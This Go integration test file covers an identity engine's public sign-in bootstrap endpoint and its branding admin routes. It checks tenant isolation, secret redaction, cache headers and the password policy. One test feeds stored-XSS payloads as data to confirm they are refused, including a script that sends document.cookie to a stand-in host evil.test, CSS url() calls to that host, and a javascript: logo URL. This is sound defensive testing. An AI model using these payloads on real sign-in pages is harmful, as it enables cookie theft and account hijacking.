//go:build integration

/*
 * Authn Platform — Enterprise Identity Engine
 * File: apps/auth-engine/test/app_config_test.go
 * Tier: Integration Tests
 *
 * Drives the bootstrap document a sign-in page fetches before it renders, and the
 * administrative branding routes that shape it, through the real guards.
 *
 * The package's unit tests already prove that the projections withhold what they
 * should. What only an end-to-end test can show is the part that lives outside
 * those functions: that the publishable key is genuinely required and cannot be
 * substituted with a secret one, that the tenant is taken from the key rather than
 * from a request that names another, that a branding column polluted by a real ORM
 * write is still narrowed on the way out, and that the password rule the document
 * publishes is the rule the sign-up path actually enforces.
 *
 * License: GNU AGPLv3 — Copyright (C) Authn Platform Authors
 */

package integration_test

import (
	"net/http"
	"strings"
	"testing"

	"github.com/hanan-bhatti/authn-2.0/apps/auth-engine/ent"
	"github.com/hanan-bhatti/authn-2.0/apps/auth-engine/ent/tenantenvironment"
	"github.com/hanan-bhatti/authn-2.0/apps/auth-engine/internal/appconfig"
	"github.com/hanan-bhatti/authn-2.0/apps/auth-engine/pkg/idgen"
)

const (
	// appConfigPath is the public bootstrap document.
	appConfigPath = "/v1/client/app-config"
	// brandingPath is the administrative read and write behind it.
	brandingPath = "/v1/tenant/branding"
)

// withoutPublishableKey strips the key the harness attaches to every request, so
// the unauthenticated case can be driven through the same helper as the rest.
func withoutPublishableKey() func(*http.Request) {
	return func(r *http.Request) { r.Header.Del("X-Authn-Publishable-Key") }
}

// withSecretKey presents the seeded backend credential the admin guard accepts.
func withSecretKey() func(*http.Request) {
	return withHeader("X-Authn-Secret-Key", secretKey)
}

// storeSettingsColumn writes one settings column on a tenant's environment row
// directly through the ORM, creating the row when the tenant has none yet.
//
// It bypasses the engine's own write path deliberately. The settings endpoints
// validate and clamp, so they could never produce the column states these tests
// need: one holding the private settings a column shares space with, or a policy
// below the engine's floor. A real deployment reaches those states through
// migrations and hand-edited rows, and the question under test is what the read
// side does with them.
func (e *testEnv) storeSettingsColumn(t *testing.T, tenantID string, apply func(*ent.TenantEnvironmentCreate, *ent.TenantEnvironmentUpdateOne)) {
	t.Helper()

	ctx := e.bypassContext()
	client := e.factory.GetClient(ctx, tenantID, testEnvironment)

	existing, err := client.TenantEnvironment.Query().
		Where(
			tenantenvironment.TenantID(tenantID),
			tenantenvironment.EnvironmentEQ(tenantenvironment.Environment(testEnvironment)),
		).
		Only(ctx)
	switch {
	case err == nil:
		update := client.TenantEnvironment.UpdateOneID(existing.ID)
		apply(nil, update)
		if _, err := update.Save(ctx); err != nil {
			t.Fatalf("updating settings for %s: %v", tenantID, err)
		}
	case ent.IsNotFound(err):
		create := client.TenantEnvironment.Create().
			SetID(idgen.New("tenv")).
			SetTenantID(tenantID).
			SetEnvironment(tenantenvironment.Environment(testEnvironment))
		apply(create, nil)
		if _, err := create.Save(ctx); err != nil {
			t.Fatalf("creating settings for %s: %v", tenantID, err)
		}
	default:
		t.Fatalf("reading settings for %s: %v", tenantID, err)
	}
}

// storeBrandingColumn writes the tenant's branding column directly.
func (e *testEnv) storeBrandingColumn(t *testing.T, column map[string]interface{}) {
	t.Helper()
	e.storeSettingsColumn(t, testTenant, func(c *ent.TenantEnvironmentCreate, u *ent.TenantEnvironmentUpdateOne) {
		if c != nil {
			c.SetBrandingConfig(column)
			return
		}
		u.SetBrandingConfig(column)
	})
}

// storeSocialProvidersColumn writes the tenant's social provider configuration
// directly, credentials included, so the read side is exercised against the shape
// a configured tenant really holds.
func (e *testEnv) storeSocialProvidersColumn(t *testing.T, column map[string]interface{}) {
	t.Helper()
	e.storeSettingsColumn(t, testTenant, func(c *ent.TenantEnvironmentCreate, u *ent.TenantEnvironmentUpdateOne) {
		if c != nil {
			c.SetSocialProviders(column)
			return
		}
		u.SetSocialProviders(column)
	})
}

// storePasswordPolicyColumn writes the tenant's password policy column directly.
//
// The policy repository clamps what it stores, so a policy weaker than the
// engine's floor cannot be created through it. Writing the column is how a test
// reaches the state a legacy row or a hand-edited database is in.
func (e *testEnv) storePasswordPolicyColumn(t *testing.T, column map[string]interface{}) {
	t.Helper()
	e.storeSettingsColumn(t, testTenant, func(c *ent.TenantEnvironmentCreate, u *ent.TenantEnvironmentUpdateOne) {
		if c != nil {
			c.SetPasswordPolicy(column)
			return
		}
		u.SetPasswordPolicy(column)
	})
}

// bootstrap fetches the document and decodes it, failing the test on any status
// other than 200.
func (e *testEnv) bootstrap(t *testing.T, decorate ...func(*http.Request)) (appconfig.AppConfig, string) {
	t.Helper()

	resp := e.do(t, http.MethodGet, appConfigPath, nil, decorate...)
	if resp.status != http.StatusOK {
		t.Fatalf("GET %s = %d, want 200: %s", appConfigPath, resp.status, resp.body)
	}

	var doc appconfig.AppConfig
	resp.json(t, &doc)
	return doc, string(resp.body)
}

// TestAppConfigRequiresAValidPublishableKey covers the guard on the public
// document.
//
// The secret-key case is the one worth stating outright: the two credentials
// travel in different headers and answer different questions, and a route that
// accepted either would let a key meant for a browser be used where a backend
// credential was expected. The type check inside the guard is what prevents it.
func TestAppConfigRequiresAValidPublishableKey(t *testing.T) {
	env := newTestEnv(t, nil, nil)

	cases := []struct {
		name       string
		decorate   func(*http.Request)
		wantStatus int
	}{
		{
			name:       "no key at all",
			decorate:   withoutPublishableKey(),
			wantStatus: http.StatusUnauthorized,
		},
		{
			name:       "a well-formed key that was never issued",
			decorate:   withHeader("X-Authn-Publishable-Key", "pk_test_neverissued0000000000000000000000"),
			wantStatus: http.StatusUnauthorized,
		},
		{
			name:       "a secret key offered as a publishable one",
			decorate:   withHeader("X-Authn-Publishable-Key", secretKey),
			wantStatus: http.StatusUnauthorized,
		},
		{
			name:       "the application's own publishable key",
			decorate:   withHeader("X-Authn-Publishable-Key", publishableKey),
			wantStatus: http.StatusOK,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			resp := env.do(t, http.MethodGet, appConfigPath, nil, tc.decorate)
			if resp.status != tc.wantStatus {
				t.Fatalf("GET %s with %s = %d, want %d: %s",
					appConfigPath, tc.name, resp.status, tc.wantStatus, resp.body)
			}
		})
	}
}

// TestAppConfigResolvesTheTenantFromTheKeyNotTheRequest names a second tenant and
// a different environment in the query string while presenting the first tenant's
// key.
//
// This is the property that makes a public endpoint safe to expose at all. The
// document describes a tenant, so if a caller could choose which tenant by asking,
// one publishable key would read every customer's configuration.
func TestAppConfigResolvesTheTenantFromTheKeyNotTheRequest(t *testing.T) {
	env := newTestEnv(t, nil, nil)
	env.seedVictimTenant(t)

	// Branding the caller must not be able to reach, on the tenant it names.
	env.storeSettingsColumn(t, victimTenant, func(c *ent.TenantEnvironmentCreate, u *ent.TenantEnvironmentUpdateOne) {
		column := map[string]interface{}{"app_name": "Victim Corp Internal"}
		if c != nil {
			c.SetBrandingConfig(column)
			return
		}
		u.SetBrandingConfig(column)
	})

	doc, raw := env.bootstrap(t, withHeader("X-Authn-Environment", "live"))

	if strings.Contains(raw, "Victim Corp Internal") {
		t.Fatalf("a request naming another tenant read its branding: %s", raw)
	}
	if doc.Application.ID != testApplication {
		t.Errorf("application.id = %q, want the key's own application %q", doc.Application.ID, testApplication)
	}
	// The environment follows the credential, not the header: a test key addresses
	// test data whatever the request claims.
	if doc.Application.Environment != testEnvironment {
		t.Errorf("application.environment = %q, want %q — it must follow the key",
			doc.Application.Environment, testEnvironment)
	}

	// Naming the victim in the query string is the other half of the same attempt.
	_, rawWithQuery := env.bootstrap(t, withHeader("X-Authn-Tenant-Id", victimTenant))
	if strings.Contains(rawWithQuery, "Victim Corp Internal") {
		t.Fatalf("a tenant named in a header reached its branding: %s", rawWithQuery)
	}
}

// TestAppConfigServesBrandingWithoutItsPrivateNeighbours stores a branding column
// holding both the presentational keys and the private settings that share it,
// then reads the document back over HTTP.
//
// The unit tests assert this against the projection function. This asserts it
// against the wire, after a real ORM round trip through a JSON column — which is
// the path a leak would actually take.
func TestAppConfigServesBrandingWithoutItsPrivateNeighbours(t *testing.T) {
	env := newTestEnv(t, nil, nil)

	env.storeBrandingColumn(t, map[string]interface{}{
		"app_name":      "Acme Identity",
		"logo_url":      "https://cdn.acme.example/logo.svg",
		"primary_color": "#1a73e8",

		// Sharing the column, and not public.
		"smtp_password":       "hunter2-should-never-ship",
		"webhook_signing_key": "whsec_should_never_ship",
		"internal_notes":      "migrating off the legacy IdP on the 3rd",
		"email_templates": map[string]interface{}{
			"welcome": "Escalate to security@acme-internal.example",
		},
	})

	doc, raw := env.bootstrap(t)

	if doc.Branding.AppName != "Acme Identity" {
		t.Errorf("branding.app_name = %q, want the stored value", doc.Branding.AppName)
	}
	if doc.Branding.LogoURL != "https://cdn.acme.example/logo.svg" {
		t.Errorf("branding.logo_url = %q, want the stored value", doc.Branding.LogoURL)
	}

	for _, leak := range []string{
		"hunter2-should-never-ship",
		"whsec_should_never_ship",
		"migrating off the legacy IdP",
		"security@acme-internal.example",
		"smtp_password",
		"webhook_signing_key",
		"internal_notes",
		"email_templates",
	} {
		if strings.Contains(raw, leak) {
			t.Errorf("the public document carries %q from the shared branding column: %s", leak, raw)
		}
	}
}

// TestAppConfigReportsSocialProvidersByNameOnly stores a configured provider,
// credentials and all, and requires that only its name is published.
//
// The engine performs the authorization redirect itself, so a browser never needs
// a provider's client ID. Publishing one would put a customer's OAuth application
// identifier on every sign-in page for no gain.
func TestAppConfigReportsSocialProvidersByNameOnly(t *testing.T) {
	env := newTestEnv(t, nil, nil)

	env.storeSocialProvidersColumn(t, map[string]interface{}{
		"google": map[string]interface{}{
			"enabled":                 true,
			"client_id":               "1234567890-abcdef.apps.googleusercontent.com",
			"client_secret_encrypted": "Z0FBQUFBQm9nb29nbGVzZWNyZXQ=",
		},
		"apple": map[string]interface{}{
			"enabled":                 false,
			"client_id":               "com.acme.signin",
			"client_secret_encrypted": "Z0FBQUFBQm9hcHBsZXNlY3JldA==",
		},
	})

	doc, raw := env.bootstrap(t)

	got := doc.SignInMethods.SocialProviders
	if len(got) != 1 || got[0] != "google" {
		t.Errorf("sign_in_methods.social_providers = %v, want only the enabled provider [google]", got)
	}
	for _, leak := range []string{
		"apps.googleusercontent.com",
		"Z0FBQUFBQm9n",
		"client_id",
		"client_secret",
	} {
		if strings.Contains(raw, leak) {
			t.Errorf("the public document carries the provider credential %q: %s", leak, raw)
		}
	}

	// No SAML connection is seeded, so the SSO option must not be offered. Showing
	// it would send a user down a flow that has nothing to resolve their domain to.
	if doc.SignInMethods.EnterpriseSSO {
		t.Error("sign_in_methods.enterprise_sso is true with no SAML connection configured")
	}
}

// TestAppConfigMarksTheResponsePrivateToTheKey checks the cache directives.
//
// They are load-bearing rather than decorative. The publishable key travels in a
// header, so every tenant's document lives at the same URL: a shared cache keyed
// on the URL alone would serve one tenant's branding and enabled providers to the
// next caller. "private" keeps it out of shared caches, and the Vary keeps a
// browser from reusing one key's answer for another.
func TestAppConfigMarksTheResponsePrivateToTheKey(t *testing.T) {
	env := newTestEnv(t, nil, nil)

	resp := env.do(t, http.MethodGet, appConfigPath, nil)
	if resp.status != http.StatusOK {
		t.Fatalf("GET %s = %d, want 200: %s", appConfigPath, resp.status, resp.body)
	}

	cacheControl := resp.headers.Get("Cache-Control")
	if !strings.Contains(cacheControl, "private") {
		t.Errorf("Cache-Control = %q, want it to mark the response private: the key is a header, so every tenant shares this URL",
			cacheControl)
	}

	vary := resp.headers.Get("Vary")
	if !strings.Contains(vary, "X-Authn-Publishable-Key") {
		t.Errorf("Vary = %q, want it to name the publishable key header", vary)
	}
}

// TestAppConfigPublishesThePasswordRuleTheEngineEnforces stores a minimum length
// below the engine's floor and then checks both sides of the contract: what the
// document reports, and what the sign-up path does with a password that satisfies
// the stored value but not the floor.
//
// The two have to agree. A page told the stored 4 would accept a six-character
// password and then show the user a server error, which reads as a broken site
// rather than as a password rule.
func TestAppConfigPublishesThePasswordRuleTheEngineEnforces(t *testing.T) {
	env := newTestEnv(t, nil, nil)

	env.storePasswordPolicyColumn(t, map[string]interface{}{
		"enforcement_mode": "require",
		"min_length":       4,
		"max_length":       0,
		"require_numeric":  true,
	})

	doc, _ := env.bootstrap(t)

	if doc.PasswordRules.MinLength != 8 {
		t.Errorf("password_rules.min_length = %d, want the enforced floor 8", doc.PasswordRules.MinLength)
	}
	if doc.PasswordRules.MaxLength != 4096 {
		t.Errorf("password_rules.max_length = %d, want the enforced ceiling 4096", doc.PasswordRules.MaxLength)
	}
	if !doc.PasswordRules.Enforced {
		t.Error("password_rules.enforced should be true under the \"require\" mode")
	}

	// The published rule is only worth anything if it matches the refusal. This
	// password clears the stored minimum of 4 and misses the published 8, and the
	// refusal has to name the length rather than merely be some other 4xx — a
	// signup rejected for an unrelated reason would prove nothing about the rule.
	const shortPassword = "Ab3xyz"
	refused := env.signUp(t, "floor-probe@acme.example", shortPassword, "Floor Probe")
	if refused.status != http.StatusBadRequest {
		t.Errorf("signup with a %d-character password = %d, want 400 while the document publishes a minimum of %d: %s",
			len(shortPassword), refused.status, doc.PasswordRules.MinLength, refused.body)
	}
	if !strings.Contains(string(refused.body), "min_length") {
		t.Errorf("the signup refusal should name the length rule the document publishes, got: %s", refused.body)
	}

	// And a password that satisfies the published rule is accepted, so the rule is
	// the boundary rather than a blanket refusal.
	accepted := env.signUp(t, "floor-ok@acme.example", "Ab3xyz789", "Floor OK")
	if accepted.status != http.StatusCreated {
		t.Errorf("signup with a password satisfying the published rule = %d, want 201: %s",
			accepted.status, accepted.body)
	}
}

// TestBrandingWriteRoundTripsToThePublicDocument drives the administrative write
// and then reads the result back through the public endpoint.
//
// The two routes are the halves of one feature: a write nobody can read is inert,
// and a read with nothing behind it returns an empty document forever.
func TestBrandingWriteRoundTripsToThePublicDocument(t *testing.T) {
	env := newTestEnv(t, nil, nil)

	written := map[string]any{
		"app_name":      "  Acme Identity  ",
		"logo_url":      "https://cdn.acme.example/logo.svg",
		"logo_dark_url": "cdn.acme.example/logo-dark.svg",
		"primary_color": " #1a73e8 ",
		"font_family":   "Inter, sans-serif",
		"support_url":   "https://acme.example/support",
		"custom_css":    ".authn-card { border-radius: 12px }",
	}

	resp := env.do(t, http.MethodPut, brandingPath, written, withSecretKey())
	if resp.status != http.StatusOK {
		t.Fatalf("PUT %s = %d, want 200: %s", brandingPath, resp.status, resp.body)
	}

	var stored appconfig.Branding
	resp.json(t, &stored)
	// The write normalizes: the reply is what was stored, not what was sent.
	if stored.AppName != "Acme Identity" {
		t.Errorf("the write reply reports app_name %q, want it trimmed", stored.AppName)
	}
	if stored.LogoDarkURL != "https://cdn.acme.example/logo-dark.svg" {
		t.Errorf("the write reply reports logo_dark_url %q, want a scheme-less URL resolved to https", stored.LogoDarkURL)
	}

	// The administrative read agrees with the write.
	readBack := env.do(t, http.MethodGet, brandingPath, nil, withSecretKey())
	if readBack.status != http.StatusOK {
		t.Fatalf("GET %s = %d, want 200: %s", brandingPath, readBack.status, readBack.body)
	}
	var administrative appconfig.Branding
	readBack.json(t, &administrative)
	if administrative != stored {
		t.Errorf("the administrative read disagrees with the write:\n stored=%+v\n   read=%+v", stored, administrative)
	}

	// And so does the document a sign-in page fetches.
	doc, _ := env.bootstrap(t)
	if doc.Branding != stored {
		t.Errorf("the public document disagrees with the stored branding:\n stored=%+v\npublished=%+v",
			stored, doc.Branding)
	}
}

// TestBrandingWriteRefusesAStyleBreakout drives the values that would turn
// branding into script execution on the sign-in page.
//
// Branding is interpolated into a <style> element and into individual
// declarations, so a value that can close either one is a stored cross-site
// script in the one place a user is about to type their password. The refusal has
// to happen at the write, because every reader downstream treats the stored column
// as already checked.
func TestBrandingWriteRefusesAStyleBreakout(t *testing.T) {
	env := newTestEnv(t, nil, nil)

	cases := []struct {
		name    string
		payload map[string]any
	}{
		{
			name:    "custom css closing the style element",
			payload: map[string]any{"custom_css": "body{}</style><script>fetch('//evil.test?c='+document.cookie)</script>"},
		},
		{
			name:    "font family ending the declaration",
			payload: map[string]any{"font_family": "Inter; behavior: url(//evil.test/x.htc)"},
		},
		{
			name:    "colour carrying a whole declaration",
			payload: map[string]any{"primary_color": "red; background-image: url(//evil.test/x)"},
		},
		{
			name:    "logo url with a javascript scheme",
			payload: map[string]any{"logo_url": "javascript:alert(document.domain)"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			resp := env.do(t, http.MethodPut, brandingPath, tc.payload, withSecretKey())
			if resp.status != http.StatusBadRequest {
				t.Fatalf("PUT %s with %s = %d, want 400: %s", brandingPath, tc.name, resp.status, resp.body)
			}

			// A refused write must leave nothing behind for the public document to
			// serve.
			_, raw := env.bootstrap(t)
			if strings.Contains(raw, "evil.test") || strings.Contains(raw, "javascript:") {
				t.Errorf("a refused write reached the public document: %s", raw)
			}
		})
	}
}

// TestBrandingRoutesRefuseAPublishableKey checks the privilege separation between
// the two credentials on the same feature.
//
// A publishable key ships in browser bundles, so anyone who loads a sign-in page
// holds one. If that key could write branding, it could write the stylesheet of
// every sign-in page the tenant serves — which is the style-breakout payload
// above, delivered by someone who never had an administrator's credential.
func TestBrandingRoutesRefuseAPublishableKey(t *testing.T) {
	env := newTestEnv(t, nil, nil)

	// A baseline the refused write must not disturb.
	env.storeBrandingColumn(t, map[string]interface{}{"app_name": "Acme Identity"})

	write := env.do(t, http.MethodPut, brandingPath, map[string]any{
		"app_name": "Attacker Controlled",
	})
	if write.status != http.StatusUnauthorized {
		t.Errorf("PUT %s with only a publishable key = %d, want 401: %s", brandingPath, write.status, write.body)
	}

	read := env.do(t, http.MethodGet, brandingPath, nil)
	if read.status != http.StatusUnauthorized {
		t.Errorf("GET %s with only a publishable key = %d, want 401: %s", brandingPath, read.status, read.body)
	}

	doc, _ := env.bootstrap(t)
	if doc.Branding.AppName != "Acme Identity" {
		t.Errorf("branding.app_name = %q after a refused write, want the stored %q",
			doc.Branding.AppName, "Acme Identity")
	}
}

// TestAppConfigServesAnUnconfiguredTenant checks the state every tenant starts in.
//
// Nothing here is configured, so the document has to be renderable from defaults
// alone: empty branding, the engine's base credentials, and the default password
// rule. A sign-in page that could not bootstrap until an administrator had set a
// logo would leave every new tenant unable to sign anyone in.
func TestAppConfigServesAnUnconfiguredTenant(t *testing.T) {
	env := newTestEnv(t, nil, nil)

	doc, _ := env.bootstrap(t)

	if doc.Branding != (appconfig.Branding{}) {
		t.Errorf("an unconfigured tenant should report empty branding, got %+v", doc.Branding)
	}
	if !doc.SignInMethods.Password || !doc.SignInMethods.Passkey {
		t.Errorf("the engine's base credentials must always be offered, got %+v", doc.SignInMethods)
	}
	if doc.SignInMethods.SocialProviders == nil {
		t.Error("social_providers should be an empty array rather than null, so a client can iterate it unconditionally")
	}
	if doc.PasswordRules.MinLength != 8 {
		t.Errorf("password_rules.min_length = %d, want the default 8", doc.PasswordRules.MinLength)
	}
	if doc.EmailVerification.Mode == "" {
		t.Error("email_verification.mode should report a mode rather than an empty string")
	}
	// The deployment configures no SMS driver, so a code cannot be delivered and
	// the factor must not be offered.
	if doc.SecondFactors.SMS {
		t.Error("second_factors.sms is true on a deployment with no SMS driver configured")
	}
	if doc.AccountRecovery.PhoneOTP {
		t.Error("account_recovery.phone_otp is true on a deployment with no SMS driver configured")
	}
	if doc.Tenant.Name == "" && doc.Tenant.Slug == "" {
		t.Error("the tenant's public identity should be populated from the seeded row")
	}
}
